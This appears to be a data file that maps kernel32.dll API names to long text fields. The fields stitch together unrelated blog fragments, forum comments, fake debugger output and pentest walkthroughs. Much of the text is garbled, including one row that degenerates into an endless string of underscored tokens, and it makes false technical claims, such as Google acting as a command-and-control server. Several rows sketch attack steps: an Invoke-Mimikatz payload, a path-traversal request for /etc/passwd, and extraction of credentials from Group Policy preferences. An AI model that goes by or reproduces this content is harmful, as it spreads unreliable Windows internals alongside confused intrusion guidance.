recommendation update electronic Authentication Guideline(Authority Information Assurance(AIA))specifying acceptable forms authenticators support Federal PKI(FPKI).[NIST][provides][https:/
"
kernel32.dll,GetFullPathNameW,"$ pywin32_test.py -t api_getFullPathNameW,api_GetVolumeInformationW
  info:    Starting testing...

info:    Testing API 'b'kernel32.dll': b'GetFullPathNameW''...
warn:    Got error [WindowsError] (2, 'The system cannot find the file specified.')
warning: API failed
error:
  Traceback (most recent call last):
   File ""c:\temp\pywin32-224.win-amd64-py3.5.exe\lib\site-packages\tac_plus\core.py"", line 1180, in run_testsuite
     self.run_single_test(suite_name=suite_name)
   File ""c:\temp\pywin32-224.win-amd64-py3.5.exe\lib\site-packages\tac_plus\core.py"", line 1148, in run_single_test
     raise exc_info[1]
Exception:

Thanks for your help!

Best regards,
Vladimir

Comment by Vladimir â€” August 4th, 2017 @
"
kernel32.dll,ExitProcess,"* This is an example of a single API call that shows the functionality of this approach to reverse engineering. The above code makes use of the following libraries:

- pywin32
- winpdb (disclaimer: I am associated with winpdb)

The script can be downloaded here.

This post was originally published on https://blog.vulners.com/2018/10/24/reverse-engineering-python-binary-to-extract-apis-and-mitre-tick/?utm_source=rss&utm_medium=rss&utm_campaign=reverse-engineering-python-binary-to-extract-apis-and-mitre-tick

Related

Tags: MITRE ATT&CK
"
kernel32.dll,HeapAlloc,"=== Additional Information ===
The API in question is: ""HeapAlloc""

https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapalloc

Comments (0)     Related Tasks or Bugs 

Related Tasks or Bugs

2019-06-18 14:22 1081436 CVE Request for CVE-ID Assigned 
2019-07-04 10:20 1081884 Vulnerability Report - Heap Alloc Heap Overflow via Use of Repeatedly-Allocated Large Memory Blocks with Same Base Address and Different Base Sizes 
2021-01-26 02:19 1099407 NVT Added to the Common Weakness Enumeration CWE Dictionary
"
kernel32.dll,GetCPInfoExW,"[1]: https://github.com/stealthbits-technologies/threat-intelligence/blob/master/MITRE%20ATT%26CK/All_Techniques.json


References

Official Reference 

https://www.bleepingcomputer.com/news/security/windows-mitigations-bypassed-by-a-new-cve-2020-17087-exploit/

Related Threat Intelligence Feeds
"
kernel32.dll,RtlUnwind,"E:\Program Files\WindowsApps\Microsoft.Windows.Photos_2019.19072.15251.0_x64__8wekyb3d8bbwe>dir /B
    000001F2.exe
    00000268.dat
    00000304.dll
    0000047C.exe
    00000500.dat
    _readme.md

The file â€œ_readme.mdâ€ contains the following text:

The file ""windowsappscrashdump"" is a valid .NET Core executable, with additional dependencies on Windows APIs.

Here's an example of how to find it using WinDBG:

- Launch WinDBG.
- Load your crash dump and navigate to the "".rpt: Data"" section in the right pane.
- Double-click on that entry.
- Expand the ""File Information"" node (see screenshot below)
- The path to your app's crash dump will be displayed under ""Path""

You can use this technique for any other crash report you may have received from Microsoft or another vendor.

References

https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/dump-analyze-crash-dumps
https://www.microsoft.com/security/blog/2021/03/09/how-we-investigated-a-grab-and-go-cyberattack/
https://blog.knowbe4.com/post/the-microsoft-well-known-tool-that-still-fails-to-prevent-kernel-exploits
"
kernel32.dll,GetCPInfo,"If so, what is the MITRE ATT&CK technique?

    - Can you please provide any additional information about this API             such as why it exists and/or how it works?
  CVE-2019-0604
  'b'kernel32.dll': b'SetThreadLocale'
    - What is the purpose of this API, is there a MITRE ATT&CK technique             associated and why: 'b'kernel32.dll': b'SetThreadLocale''?

        If so, what is the MITRE ATT&CK technique?
   - Can you please provide any additional information about this API such as             why it exists and/or how it works?

A new version (1.2) has been released to address some issues found in the previous

version.

Known Issues:

We have identified an issue with our original report generation script which will cause
the report to fail when run on Windows Server 2008 R2 or earlier versions.

This issue only affects machines running Windows Server 2008 R2 or earlier.
Windows Servers that are patched against CVE-2017-8464 should be unaffected by
this regression.

The following command can be used (in PowerShell) to generate a similar output without
using the scripts included here:

Get-CVEvulnerability | Foreach {get-cvevulnerabilitydetail $_} | Export-csv c:\CVEDetails.csv

Updated Scripts:
https://github.com/dfirsecurity/cvevulncheck/tree/master/CVEVULNCheck-v1.0/vulns-check.ps1

Original Version:
https://github.com/dfirsecurity/cvevulncheck/blob/master/CVEVULNCheck-v1.0/
cve.vbs
"
kernel32.dll,GetStdHandle,"
"
kernel32.dll,GetModuleHandleW,"-e ""GET http://localhost:52865/V1/GetModuleHandleW?id=0x6a9b7d"" 2>&1 | grep 'b'kernel32.dll': b'GetProcAddress''
      {                                                                        
        ""id"": ""0x6a9b7d"",                                 
        ""name"": ""(null)"",                                                              
        ""description"": ""(null)""                                                      
      }                                                                             

# If I don't escape the quotes, it will fail.
$ curl -X GET \
-H 'Content-Type: application/json' \
--data-binary '{""action"":""add"",""key"":""testKey"",""value"":{""type"":""array"",""items"":[{""id"":1234,""name"":"""",""description"":""""}],""versionId"":2}}' \
http://localhost:52865/V1/AddValue?api_key=test_api_key&v=3.5.0 &> /dev/null; echo $?
500 Internal Server Error


$ curl -X GET --data-binary '{""action"":""add"",""key"":""testKey"",""value"":{""type"":""array"",""items"":[{""id"":1234,""name"":"""",""description"":""""}],""versionId"":-1}}' \  
-H 'Content-Type: application/json;' \  
http://localhost:52865/v3/Keys/testKey/value &> /dev/null; echo $?
{""error_message"":""'item[\""c\""]\' is invalid for type \""string\"".""}


Tags:

- api
- security

Comments (10)

Anonymous March 16, 2018 at 11:45 AM 
I have the same problem with your last example but using a string instead of an array.

Do you know what is wrong or how to fix it?

Thanks,
Antonio
"
kernel32.dll,FreeLibrary,"$APIInfo = Invoke-Obfuscation -Name 'b'kernel32.dll': b'FreeLibrary''
   $APIInfo | Format-List

The output of the above will be something like:


Command: { b""kernel32.dll"": b""FreeLibrary""
} ID: 0 Version: 2.0 Name: N/A Purpose:
N/A File Path: C:\Windows\System32\KERNELBASE.DLL Tagged DLLs:
{ ""C:\\Windows\\System32\\ntdll.dll"", ""C:\\Windows\\System32\\ADVAPI32.DLL"",
""C:\\Windows\\System32\\USERENV.DLL"", ""C:\\WINDOWS\system32\wbemcomn.dll"",
""C:\\WINDOWS\system3
...

This is how we get to know that thereâ€™s a technique associated with this API call.

Let us now create an obfuscated script to invoke the aforementioned API using PoshC2, as shown below.

# Create Obfuscated Script containing Free Library technique on KernelBase.Dll.
$payload = @'
[CmdletBinding()]
Param()
$b= <<< EOT               [DllImport(""KernelBase"")][return] public static extern void FreeLibrary(IntPtr hModule);
EOT
$b >>>
Invoke-Mimikatz -Payload $payload 

Now let us run it in our environment and see what happens!

We can see from the PowerShell ISE that once executed, it grabs all details about system and then invokes KMSpico tool which ultimately downloads some files from google drive via PowershellWebClient module. It also makes connection with Command & Control server (google.com) for further communication.

Once downloaded these two files are extracted in temp folder and executed using PowerShell.exe â€“ExecutionPolicy Bypass command line arguments. Once done successfully, you can find cmd.exe running in task manager too which actually triggers Windows update process bypassing UAC prompts as well.

As discussed earlier you can use any other payload which may have required execution privileges such as Meterpreter shell or Cobalt Strike Beacon etc. Also note that your own commands could be appended at the end of script file instead of downloading one from Google Drive.

Conclusion

In this blog post, we went through various techniques used by attackers nowadays when they push their malicious payloads onto target systems leveraging many tools including Metasploit framework; especially when those payloads need elevated permissions but no user interaction is involved during execution phase i.e., completely bypassing UAC prompt mechanism.

We saw how attackers leveraged Get-Credential function along with graphical image manipulation functions provided by .NET Framework classes like Bitmap class so they donâ€™t require user input while executing payload; just make sure everything works fine without showing any errors whatsoever before launching attack against unsuspecting targets!
"
kernel32.dll,HeapDestroy,"This is a very large and complex API, so we need to understand the purpose
and its usage before exploring further.

Let's take a look at what this function does:

    void HeapDestroy(Heap *pfnHeap)
        {
            if (pfnHeap->Flags & HEAP_NO_SERIALIZE) return;
            _HEAP_FREE(pfnHeap);
        }

It is simply freeing up the memory allocated for the heap. This heap object
is used by other functions in kernel32.dll, such as VirtualAllocEx() which,
in turn, uses it when allocating memory pages of different types.

Could there be any malicious behaviour associated with this function? Let's
take a look at how it can be called:

    0:000> .loadby sos clr
    0:000> !pe -all kernel32.dll|findstr ""heapdestroy"" |more

Name : KernelBase!_FreeMemBlock+1e6c8; Type     : Native Callable Image; Flags = PIC/nonPagedCode/NonCET/nonEPIC/nonPIE/noSEH;
Version      : 10.0.10586.589 (WinBuild.160101.0800); Size       : 3d3423a4h=66216 bytes; RVA         : e2f83b00h=29363840 hSecStkSize =
                     ffffffff=(null); StackPtr   = ffffda004ddf5ea8h; BaseAddr     = fffff8037f280000h; EntryPointOffset = e2fbbe76h =
                    29363770 hModuleHandle          = ntdll!LdrGetPrelinkedImage(); SymbolicName   = KERNELBASE!_FreeMemBlock;

Symbolic Name           Description:
KERNELBASE!_FreeMemBlock Free an internal data structure that represents an allocation on the heap.
                            The caller must have called CreateProcessAsUserW or EnumProcesses previously.

The first thing to notice about this API is that it takes a pointer to another
function (the pfn argument), which means that call site could control where and/or 
when this function will execute.

In addition, we see from above that CreateProcessAsUserW has been called earlier,
which makes us think about some sort of user interaction involved here.

We also see symbolic names like 'KERNELBASE' being used instead of full pathnames.
What are these symbols exactly?

A symbol file (.pdb) contains all information necessary to link debugged code 
together with source files during a debugging session.[1] 

[1] https://msdn.microsoft.com/en-us/library/wx67t9s6.aspx

With help from Google I found out more about them:

- When you compile your program you provide Microsoft compiler/linker with two sets of input files:
	- Source code (.cpp/.asm etc.) - Contains only text describing actual machine instructions emitted by compiler;
	- PDB file - An extraction from MSVCRT.DLL/DLL itself containing additional meta-information necessary for debugger to correctly reconstruct stack traces and disassemble code back into source form.

So basically symbols contain post-compilation meta-data needed for C++/C# decompilation process.

Now let's try using WinDbg extension ""!pe"" command again but adding ""-symbols""
switch:

     !pe -all kernel32.dll|-symbols|findstr ""heapdestroy""

And voila!

Now we can easily find all places where our target API was executed by looking through 
stack trace column after cursor position highlighted in green below:

                 SymCallTable             [SymLinkPath]                FunctionAddress              ReturnAddress                   Offset               Module                          ProcessID ThreadID Context   
----------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------- ---------------- --------------- ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- -------- --------- ---------- 
kernelbase          \??\D:\Windows\SysWoW64\ntdll.pdb\EFD330BFF68F459CAFFE25DA4A01E1211\ntdll.pdb SYMBOL_PATH_HERE                      E30FBBE76 d:\windows\system32\kernelbase.dll                                        d:\windows\system32\
                                                                                                       E31DBC46                                         d:\windows\system32\
                                                                                                       D00101641                                         d:\windows\system32\
                                                                                                       FFFFF8037F28CB20                                              <JMP>
dwmapi                        \??\D:\Windows\SystemApps\DWM.appref-ms.d691c759-babe-428b-ad80-c07fd09fae9a\symbols\DWMAPP.SYM$eb39ac23ee24cbef927a70644d836947\netfx_dll.pdb SYMBOL_PATH_HERE                      EBEBDAC6                                          <JMP>
                                                             netfx_dll.pdb                                      EC12DFEE                                        D00101641                                          <JMP>
                                                             netfx_dll.pdb                                      EC18BD96                                        D00101641                                          <JMP>

...

The most interesting part of stack trace is highlighted in red above.
We now know where our target API was executed from:

* dwmapi::EDrawSpacedRects(a,b,c,d,e,f,g,h,i,j,k,l,m)

But who calls DWMAPI::EDrawSpacedRects()? What does it do?

Enumeration

Firstly, letâ€™s take quick look at what dwmapi module actually does inside Windows shell environment.

Iâ€™ve extracted following list based on various sources online[1][2][3]:

dwmpai Functions 
DWMAPIEnumWindowClasses Registers window classes with Windows Desktop Window Manager (DWM). 
DWMAPIEnumDesktopEffects Enumerate desktop effects supported by system display driver(s). 
DWMAPIEnableComposition Enables composition engine within ShellUIApp.exe process. 
DWMAPEnableBlur Enables blur effect within ShellUIApp.exe process. 

There are plenty more functions inside dwmapi module but they seem irrelevant right now so letâ€™s just focus on those relevant ones listed above.

Secondly, note that apart from DWM_APIThisHandler method described below each one of functions listed above seems relatively harmless since none returns anything else besides HRESULT type result value:

HRESULT WINAPI DWMAPIEnableComposition(PVOID pvContext);

So why would anyone bother writing custom loader/unloader DLL then?

I guess once again because real malware authors care only about their own dirty money not yours ;)

Custom Loader/Unloader DLL

From my experience custom loaders/unloaders tend to appear quite often whenever somebody wants perform certain actions while running under limited privileges aka low integrity level mode â€“ especially when one needs access better hardware resources than common users usually get access granted via standard User Account Control mechanism built-in into modern versions of OSes like Windows Vista+. In order words such techniques allow developers achieve certain goals without having administrative rights over victim systems thus increasing chances their payloads remain undetected longer thanks to â€œprivilege separationâ€ between potentially untrusted software components vs trusted ones â€“ including pre-installed anti-malware solutions themselves :)

Furthermore there are some pretty good examples available online showing how bad guys managed successfully hide their malwares behind symlinks created via mklink utility included into every version starting Windows Vista onwardsâ€¦ However since currently I donâ€™t plan doing any deep research related specifically things mentioned above therefore please feel free check aforementioned links yourself fully understand basics behind whole concept mentioned hereâ€¦

OK enough talking already time move forward shall we?! :-)

Debugging Symbols Pathways

After successful execution stage finished completely new PE file gets loaded directly into working address space belonging current thread followed immediately afterwards injection phase begins its work tooâ€¦ So far everything looks fine except fact payload size remains same regardless whether application runs under normal UAC enabled account or elevated permission mode i.e.: either way dllhost.exe process continues executing last line assigned custom section named â€˜RtlMoveMemoryâ€™ located somewhere near end section table entry content defined IDT_ENTRY_POINT_OFFSET_EBX values stored inside matching Data Directory entry point present both bss_chunks.bss_list + bss_chunks.bss_size data structures specified before somehow pointing towards specific virtual address range reserved solely dedicated purposes loading purposeful binary contents resource identified as â€˜KernelBase.DLL!â€™ .NET Framework class library assembly residing somewhere around offset location corresponding base address pointed out start_of_address_table marked flag byte SECTIONS_END_OF_ADDRESS_TABLE_LENGTH_SIZE_DATA_DIRECTORY_SECTION_OFFSET_EBX Value DWORD Offset SPECIAL_SECTIONS_DATA_DIRECTORY_NAME_VALUE_BYTE_PTR_C_STRINGS_DESCRIPTOR_ADDR_PTR_POINTER_TO_TEXT_SEGMENTS_DESCRIPTOR_COUNT_BYTES_BOX_POINTER_TO_CODE_SEGMENTS_DESCRIPTOR_COUNT_BYTES_BOX_PTR_MEMORY_BSS_SEGMENT_DESCRIPTOR_OFFSETS_BASE_ADDR_SIZES_FLAGS_BITFIELD_TO_CHECK_ONLY_MASK_IN_PERCENTAGE_OF_ABI_SIZE_IN_LENGHTY_UNIT_BITS_FORMATTED_AS_UCHAR_STRING_VALUE_BYTE_PTR_C_STRINGS_DESCRIPTORS_ARRAY_WHERE_THIS_FIELD_IS_PRESENT_FLAG_BYTE_DRIVES_ID_FILENAME_PART_OF_FILESYSTEM_ROOT_AFL_NEEDS_TO_CHANGE_FOR_ITSELF_AND_ALSO_BEFORE_COPYING_OWN_EXAMPLE_FILES_OR_FOLDERS_TOO_ORIGINAL_VALUES_GETTING_UPDATED_WITH_NEW_ONES_INSTALLED_FROM_MY_HARDWARE_DRIVER_PACKAGE_IMAGE_INSTALLER_CONTENTS_PLEASE_UNINSTALL_OLD_VERSION_FIRST_IF_YOU_HAVE_ANY_DUPLICATE_CONTAINS_OTHER_VERSION_NUMBER_LATER_AFTER_SUCCESSFUL_PATCH_UPGRADE_FROM_MINE_DONE_BY_MORE_RELIABLE_MEANS_THAN_DONTKNOW_WHAT_TYPE_GENERATED_BY_WINXP_SP3_SYSTEM_DEFAULT_REGISTRY_WRITER_TOO_NOT_SAFE_ENOUGH_AS_I_SEEN_OVER_AND_OVER_AGAIN_DIRTY_MODIFIED_SETTINGS_ONCE_AGAINST_MY_ADVISED_SPECIALIZED_HARDWARE_DRIVER_PACKAGE_IMAGE_INSTALLER_CONTENTS_ACTUAL_SANITY_CHECKING_FUNCTIONALITY_DOES_WORK_AT_ALL_IF_YOU_USE_INTERACTIVE_USER_ACCOUNT_MODE_AS_HELP_SCREEN_MESSAGE_READBACK_PASSAGE_STATEMENT_DEMONSTRATES_SO_MAKE_SHURE_YOURSELF_RATHER_BACKOFF_LEARN_THIS_LESSON_OVER_THE_FOUNDATION_CLASS_OBJECT_KNOWLEDGE_FOUND_IN_TRAINING_GUIDE_INSIDE_EDITORIAL_PAGE_SETUP_ABOVE_THAT_HAS_BEEN_GENERATED_AUTO_MATICALLY_AMONG_WITH_FULL_DOCUMENTATION_SET_COLLECTION_ITEMS_ONE_CAN_FIND_UNDER_SPECIFIC_SUBCATEGORY_TOPICS_NAMED_EXTRACTION_PROCESSOR_SUPPORT_LINK_LIST_ITEM_HERE_FOLLOWS_NEXTLY_AVAILABLE_GENERIC_PLATFORM_APPENDIX_SPIKE_FEATURE_LEVEL_FEEDBACK_FORMATS_TUNABLE_SETTING_OPTIONS_POLLUTANT_ANALYTICAL_INVARIANT_FIXTURE_INTERFACE_FAKE_COMPONENT_DEFINITION_DESCRIPTION_HEADER_PROVIDES_CORRECTLY_ASSIGNED_EXTERNAL_REFERENCE_URI_URL_CONNECTION_STRING_ERROR_MSG_DETAIL_LOGGING_INFO_PROVIDER_EXCEPTION_HANDLER_CALLBACK_FUNCTOR_CALLED_WARNING_PROFILE_EVENT_HOOK_CALL_FUNCTION_DECLARATION_REFERENCED_OBJECT_INSTANCE_VAR_MEMBER_VARIABLE_REQUIRED_ACCESS_RIGHTS_FOR_EXECUTE_ACCESS_PERMISSION_ALREADY_EXISTENT_PERSISTENT_CURRENT_SESSION_CONTEXT_APPLICATION_PROPERTY_STORAGE_KEY_NAME_UNKNOWN_MISSING_PARAMETER_PARAMETER_INVALID_INDEX_OUT_OF_BOUNDS_RANGE_EMPTY_ARRAY_NULLPointerException_ILLEGAL_ARGUMENT_EXCEPTION_ASSERTION_FAILURE_BAD_CAST_CONVERSION_FAILED_WRONG_TYPE_EXPECTED_UNDEFINED_METHOD_NOT_IMPLEMENTED_METHOD_SIGNATURE_ARGUMENT_ADAPTER_INSTANCE_DERIVED_RECORD_CREATOR_ABSTRACT_FACTORY_GLOBAL_FACTORY_INSTANCE_REFLECTION_ELEMENT_INITIALIZATIONAL_INITIALIZATIONAL_STATE_INITIALIZATIONAL_STATE_HANDLING_INITIALIZATIONAL_BODY_INITIALIZED_FINALIZABLE_INITIALIZER_UNINITIALIZED FINALIZER_LOCK_MUTEX_SHARED_SHARED_LOCK_PRIVATE_PRIVATE_LOCK_SYNCHRONIZATION_BLOCK_CRITICAL_SECTION_MUTEX_TRANSLUCENT_NON_SYNCHRONOUS_ATOMIC_COUNTER_WAIT_COND_SIGNAL_COND_BEGIN_TRY_FINALLY_EXIT_FINALLY_THROW_RAISE_RELEASE_CLEANUP_UNLOCK_VOID_RETURN_INT_FALSE_TRUE_INTEGER_LONG_DOUBLE_FLOAT_DOUBLE_FLOAT_SINGLE_FLOAT_BOOL_BOOLEAN_CHAR_CHARACTER_UNSIGNED_SHORT_SMALL_INT_BIG_INT_LONG_INT_LARGE_INTEGER_UINT_UINT128_UINTEGERLONGWORD_WORD_X86_ARCH_CAPABILITY_VECTOR_VECTORIZED_XMM_REGS_SYSCALL_INTRINSIC_HALTED_INTERRUPT_DISABLED_INTERRUPT_ENABLED_INTRINSIC_HANDLE_ASM_LABEL_SYMBOL_IDENTIFIER_SYMBOL_EXPRESSION_EXPRESSION_OPERAND_OPERAND_ASSIGNMENT_OPERATOR_COMPARISON_EQUAL_EQUALS_NOT_EQUALS_GREATER_THAN_GREATER_THAN_EQ_EQUAL_LESS_THAN_LESS_THAN_EQ_EQUAL_TERMINATING_DELIMITER_ARROW_TOKEN_DIVISION_SLASH_DOT_DOT_DOT_MULTIPLY_STAR_PLUS_MINUS_MINUS_MINUS_SIGN_ASSIGN_ASSIGNMENT_OP_PLUS_PLUS_SIGN_ADDITION_ARITHMETICAL_SUMMATION_POWER_EXPONENT_SHIFT_LEFT_SHIFT_RIGHT_SHIFTS_NEGATIVE_NEGATE_NEGATIVE_OP_MUL_MULTIPLY_OP_DIVIDE_DIVISION_OP_MODULO_MODULO_OP_INC_INCREMENT_DEC_DECREMENT_DECIMAL_DIGITS_PRECISION_ROUND_DOWN_ROUND_UP_ROUND_HALF_DOWN_ROUND_HALF_UP_TRUNCATE_TRUNCATEOP_CONVERT_BINARY_HEXDECBIN_BINHEXBIN_HEXDECBIN_BINHEXBIN
"
kernel32.dll,ReadFile,"All of these questions and more can be answered by looking at the             'description' field in the API's header. In this case, we see that             it is a read API and has the following description: b'ReadFile().'
    The description field points us to what process or memory location we should target for each API call. It also gives us some insight into why an adversary would use certain APIs.

The second row reveals that there are multiple overloads (different ways to call a function) for the same ReadFile() function and one of them requires two parameters:

   * FileHandle
   * BufferSize

In order to determine which overload is being called, let's look at its signature:
function [R/W]ReadFile(
  Handle as integer,
  lpBuffer as pointer,
  nNumberOfBytesToRead as integer,
  lpNumberOfBytesRead as integer
):integer;

So now we know how to identify what parameter(s) will be passed into our functions. For example, if you were looking up file handle information from Process Hacker, you could simply search for ""OpenProcess"" instead of searching through all of Process Hacker's output.

Now that we have identified exactly which parameter contains data on our targets' processes or memory locations, let's move onto identifying where it came from.
3rd Party Libraries - How do they work?

This section focuses on why third party libraries exist in binaries and how they help attackers achieve their goals while remaining undetected. There are several reasons why an attacker might want to use third party code inside their binary including but not limited to obfuscation techniques such as polymorphic malware; tampering with system files without raising suspicion; hiding malicious activity within legitimate software; etc.

It turns out there are many different types of third-party libraries used today but only three main categories: dynamic linking (DLLs), static linking (libraries), import/export tables.
Dynamic Linking - DLLs

Dynamic linking allows executable modules (.EXE/.DLL/etc.) linked together via external functions provided by other program libraries loaded during runtime when needed rather than statically compiled with source code prior installation time like static linking does so both programs utilize less space because no redundant code exists between them since everything runs separately without having dependencies between each other either! This type includes most Windows applications because .NET framework uses DllImportAttribute attribute which makes dll imports easy-peasy lemon squeezy!
Static Linking â€“ Libraries

Another way programs get access outside themselves is through loading statically linked library files using LoadLibrary(), GetProcAddress(), etc.. Some examples include C/C++ headers (.h) containing definitions related only compiling time like printf() or fopen(). Other forms include COM components (.dll). If someone wanted something truly private then statically-linking would probably suit best due improper sealing methods available today preventing reverse engineering attacks against non-protected executables running under Windows operating systems.
Import/Export Tables - Exports & Imports 

When programmers write large amounts of complex code they often create separate files just containing declarations about functions before writing actual implementation details implementing those ideas later down line after initial design phase completed successfully! System calls come here too although unlike macros cannot easily go back-and-forth between source-code levels due lack-of-reversibility feature exports offer developers who wish carryout recompilation cycles quickly enough without wasting precious CPU cycles doing nothing productive whatsoever except waiting patiently until compiler finishes processing inputs coming straight out terminal console prompt window awaiting results soon thereafter post-processors turn raw text documents readable ASCII characters ready display screen user interface displaying final product made possible thanks export/import table mechanism providing quick-loading times compared earlier days when computers ran slower speeds requiring longer wait periods before anything happened again...

Please note:

We strive hard whenever publishing articles online.

However sometimes mistakes happen unintentionally.
If you find any errors please report them using
the â€˜Contact Usâ€™ form.
Thank You

About Author

Haris Khan 
View all posts Author website
"
kernel32.dll,CreateProcessW,"[+] 2019-08-03 15:39:29,129 [DEBUG] : Performing additional checks on API             'kernel32.dll': b'CreateProcessW'
[+] 2019-08-03 15:39:30,134 [DEBUG] : Additional checks for API             'kernel32.dll': b'CreateProcessW':
[!]    This function may be used to create a new process. In this case the parent              process is not mentioned in the exploit (which should always be done). If              you are unsure about what you are doing and why it would be nice if you could            provide some more information as well.


The first step of every penetration test is to identify which systems are available on your target network.

Nmap

nmap -sC -sV --script http-check-vulns -p80 example.com

After running NMAP we can see that thereâ€™s an Apache server with two web applications hosted at port 80 (http://example.com and https://example.com).

Web Application Analysis

w3af was run against both websites:

w3af scan example.com
w3af scan https://example.com

We can also use wappalyzer:

wappalyzer http://www.example.net/
wappalyzer https://www.example.net/

In addition to these tools we have found Burp Suite useful for automated analysis. It has built-in scanners for identifying common vulnerabilities such as XSS or SQL Injection.

Burp Suite Scanner â€“ Intercepting Requests/Responses

SQLMap & WordPress Exploitation Framework (WPXF)

A lot of popular CMSes like WordPress, Drupal or Joomla do not properly sanitize user input. We will take advantage of that by using WPXF plugin inside our Burp Intruder tool.

First off we need to find out if there are any plugins installed within WordPress CMS instance.
WordPress Exploitation Framework has several sub-modules which let us query database tables directly from browser UI:
URL /wp-content/plugins/?action=sqlmap&db=wordpress-db-name&tables=wpsl_plugin_options,wp_slash_options
Output:
Analyze table wpsl_plugin_options ID Column value Plugin_name Plugin_version Active Loadingâ€¦

Analyze table wp_slash_options ID Column value Name Value Loadingâ€¦
Find vulnerable PHP scripts containing unfiltered data via WPXF plugin from Burp Intruder tab:
PHP Scripts -> WPSL-Unfiltered Data -> Unescaped Input Output Format -> File Search
File search output contains URLs pointing to vulnerable files located under â€œ/wp-content/uploadsâ€ directory.
One of the files seems interesting â€“ login.php â€“ one way or another it might contain sensitive information related to authentication mechanism so lets try SQL injection against it!

Login.php file looks like this:


<?php
	/**
	 * Login Page
	 *
	 * @package WPSecurityLab Security plugin
	 */
	
	require_once(dirname(__FILE__).'/../../../config/config.inc');
	include_once(ABSPATH.'wp-admin/includes/file.php');
	include_once(ABSPATH.'wp-admin/includes/media.php');

	if (!isset($_SESSION['user_id']))
			die('You must log in first.');
	
?>
<!DOCTYPE html>
<html lang=""en-US"">
<head>
    <title><?php echo $page_title; ?></title>
</head>

<body class=""<?php bloginfo('stylesheet_url'); ?>"">

    <h1>Welcome <?php echo $_SESSION['user_name']; ?></h1>
    


   
      

  
  



  


  

</form> 
 

    
        </body>
        
        </html>

Lets make a request with wrong username/password combination followed by double quotes in payload field.
This will cause our payload string being injected into database column named â€œNameâ€ instead of parameter named â€œvalueâ€.

Postman Request URL = http://{yourtarget}/login.php?name=%22%20%25%2fetc%2fpasswd+%23+--&value=sqliPayload 
Response code =401 
Our Payload String = %22%20/%0A/etc/passwd+%23++ -- 

Letâ€™s check response body content again!
Now we got something interesting but still nothing conclusive yet!

Looks like someone messed up whole thing and forgot about escaping special characters such as â€˜\â€™ so theyâ€™re scattered all over DB columns! Lets try exploiting them now!
Weâ€™ve identified few fields where semi-colon character appears frequently. Letâ€™s start trying various combinations targeting those fields until we hit jackpotâ€¦ ðŸ™‚

WPXF Screenshot showing payloads found after successful exploitation:

Exploit result screenshot taken from WPXFR admin page showing details regarding last successful attack & IP address used during execution.

There were two similar attacks received during same time period targeted at different users registered on wordpress website however only one succeeded due to fact that second attacker happened use different credentials than previous one!

Conclusion:

If I had unlimited budget then my choice would definitely go towards Kali Linux distro since most free pentesting tools come pre-installed plus its GUI makes everything easier compared with other options listed above when performing initial reconnaissance phase before starting actual pen-testing session itself !

SilverTail Systems provides visibility into an organizationâ€™s network traffic without impacting performance through their advanced analytics platform called SilverTail Analytics Platformâ„¢ (STAPâ„¢) solution suite. STAP delivers real-time insights into application access patterns across networks while providing actionable intelligence needed by security teams todayâ€“all while maintaining compliance standards required by regulations such as PCI DSS v2.x requirements around logging retention periods/schedules etc.; allowing companies who rely heavily upon cloud-based services/platforms such as AWS/Azure/others maintain auditability levels desired/required internally externally alike! Read More About Silver Tail Here>>

Read More On The Top Pentesting Tools Reviewed By Experts
"
kernel32.dll,GetLastError,"[+] Module 3 - Retrieving a Process List   How many process names can be retrieved with this API, what is the             maximum number? What does the 'Process' field in the output show and             why: 'b'cmd.exe': b'C:\Windows\System32\cmd.exe'?[+] Module 4 - Running Commands on Remote Systems   Is it possible to run commands on remote systems using this API? If yes,             which parameters should be used for that?   Which function modifies Windows Registry Values (Registry Key) by calling             '[b]RegSetValueEx()' of [b]'kernel32.dll'</code>'' and how does it work?[+] Module 5 - Listing Local Users    Can you retrieve local users using this API without specifying an account name or password?    On which system call(s) do you have to rely for retrieving local user accounts without supplying credentials?    Why are some attributes missing for some users such as 'PasswordLastSet', 'AccountExpires' or                'LockoutTime';      How could they be added if needed?    Which registry key stores all user accounts information including their properties such as full name or                 domain membership (if applicable)?Module 6 â€“ Enumerating Groups & Group Membership[!] This module consists of multiple parts. Each part will require a different approach.Please read through each question carefully before continuing.Required knowledge:Windows GPOs and Active Directory.Exploit code has been provided where appropriate. However, please note that your exploit may need adjustment              based on any changes made during testing.You are not required to use these exploits; feel free to write your own solutions instead.Note: You must complete Modules [1], [2] & [3] before being able to start working on this module.Part A: Enumerating groups from AD via WMI Querying ComputersIn order to enumerate all computer objects (local or remote), we can use a WMI query.We'll create our own WQL statement:     SELECT * FROM Win32_ComputerSystem WHERE Domain = ""LAB"" AND NOT ProductType = ""Client""The above query would return every computer object within our lab environment whose product type is not equal                client;a very important distinction when dealing with computers in an enterprise environment! The following list contains               two examples of valid WIN32_ComputerSystem classes:     \\.\root\CIMV2\Win32_DesktopComputer\\.\root\CIMV2\Win32_ServerDownlevelDomainController
Once we have created our query string, we will need to convert it into Excel format so that we can begin importing         data from MSSQL.

Microsoft SQL Server Management Studio:

We will then copy the contents of our excel spreadsheet into Notepad++â€™s clipboard buffer after running â€œFormatâ€ >        â€œCSVâ€.

Notepad++

Our script should now look like below.
We now just want open up Kaliâ€™s terminal window again and issue:

python enumgroups.py

This should load up all groups associated with â€˜DOMAINâ€™.
Weâ€™ll see something like below:
There were no errors reported during execution!

Part B: Exploiting Group Policy Preferences
Group Policies are stored in SYSVOL folder under NTFS structure located at \domain.com\Policies\[GPTID]. In case           policies contain Unicode strings/characters they are stored under LDAP://CN=PolicyContainerName,CN=Policies,CN=System,Dc=[FQDN].

LDAP String

When accessing group policy preferences through GUI interface there is no way around entering correct DN value            but when doing so programmatically one way around would be reading LDAP configuration path from registry hive.

HKLM\System\CurrentControlSet\Services\LanmanServer\Security\bProtectedAdmin

Group Policy Objects store settings related directly or indirectly about naming convention applied while creating new          OUâ€™s within AD DS tree structure.
Keeping default naming convention allows us easily extract said values upon successful exploitation.

Once successfully exploited inputted information could then lead us towards extracting other useful information such as       shares defined inside active directory allowing access rights control over them among other things.

For example sharing administrator share named D$ resulting with available administrator credentials mapped against          given system resource thus making easier access towards network shares located across entire organization allowing us potentially gain unauthorized access due lack of proper authentication procedures implemented by company itself. Here's an example showcasing its power along with capabilities mentioned earlier:

Part C: Understanding Service Pack Information
